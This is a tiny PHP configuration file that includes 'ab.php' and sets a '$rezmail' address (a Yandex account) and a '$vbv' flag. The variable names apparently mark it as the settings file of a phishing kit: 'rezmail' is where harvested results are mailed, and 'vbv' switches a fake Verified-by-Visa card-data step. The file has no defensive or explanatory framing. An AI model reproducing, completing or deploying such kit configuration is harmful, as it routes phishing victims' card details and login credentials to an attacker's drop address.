<?php
include('ab.php');
$rezmail = "layayawoff@yandex.com";
$vbv = "0";

?>